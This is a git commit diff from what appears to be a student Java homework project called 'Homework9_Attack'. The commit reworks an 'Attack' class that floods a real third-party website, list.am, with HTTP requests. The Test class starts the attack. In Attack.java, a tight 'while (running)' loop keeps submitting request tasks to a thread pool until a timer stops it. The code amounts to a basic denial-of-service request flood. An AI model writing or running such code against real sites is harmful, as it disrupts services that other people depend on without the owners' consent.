0aff458aba6ca6d54bdd9d6ab880c48df99e00ad
RomanPoghosyan <roman.poghos@gmail.com>
2020-01-09 04:09:37 +0400

    2 versions of stopping requests fix

--- JAVA/Homework9_Attack/src/com/company/Test.java
+++ JAVA/Homework9_Attack/src/com/company/Test.java
@@ -3,7 +3,7 @@ package com.company;
 import com.company.attack.Attack;
 
 public class Test {
-    public static void main(String[] args) {
+    public static void main(String[] args) throws InterruptedException {
         Attack attack = new Attack("https://www.list.am/", 500, 100);
         attack.start();
     }
--- JAVA/Homework9_Attack/src/com/company/attack/Attack.java
+++ JAVA/Homework9_Attack/src/com/company/attack/Attack.java
@@ -18,7 +18,7 @@ public class Attack {
         executorService = new ThreadPoolExecutor(requestsCount, 300, 100, TimeUnit.MILLISECONDS, new ArrayBlockingQueue<>(100));
     }
 
-    public void start(){
+    public void start() throws InterruptedException {
         Runnable task = () -> {
             try {
                 URL url = new URL(this.url);
@@ -46,33 +46,37 @@ public class Attack {
 
         // VERSION 1
 
-        ScheduledExecutorService taskSubmitter = Executors.newScheduledThreadPool(1);
-        taskSubmitter.scheduleWithFixedDelay(() -> executorService.submit(task), 0,1, TimeUnit.MILLISECONDS);
-
-        ScheduledExecutorService ses = Executors.newScheduledThreadPool(1);
-        ses.schedule(() -> {
-            System.out.println("Running task...");
-            System.out.println("Tasks done: " + ((ThreadPoolExecutor) executorService).getTaskCount());
-            executorService.shutdownNow();
-            ses.shutdownNow();
-        },milliseconds, TimeUnit.MILLISECONDS);
-
-
-
-        // VERSION 2
-
+//        ScheduledExecutorService taskSubmitter = Executors.newScheduledThreadPool(1);
+//        taskSubmitter.scheduleWithFixedDelay(() -> executorService.submit(task), 0,1, TimeUnit.MILLISECONDS);
+//
 //        ScheduledExecutorService ses = Executors.newScheduledThreadPool(1);
 //        ses.schedule(() -> {
-//            running = false;
 //            System.out.println("Running task...");
 //            System.out.println("Tasks done: " + ((ThreadPoolExecutor) executorService).getTaskCount());
 //            executorService.shutdownNow();
 //            ses.shutdownNow();
 //        },milliseconds, TimeUnit.MILLISECONDS);
-//
-//        while (running){
-//            executorService.submit(task);
-//        }
+
+
+
+        // VERSION 2
+
+        ScheduledExecutorService ses = Executors.newScheduledThreadPool(1);
+        ses.schedule(() -> {
+            running = false;
+            System.out.println("Running task...");
+            System.out.println("Tasks done: " + ((ThreadPoolExecutor) executorService).getTaskCount());
+            //executorService.shutdown();
+           // ses.shutdown();
+        },milliseconds, TimeUnit.MILLISECONDS);
+
+
+
+        while (running){
+            executorService.submit(task);
+        }
+
+        Thread.sleep(10000);
     }
 
 }
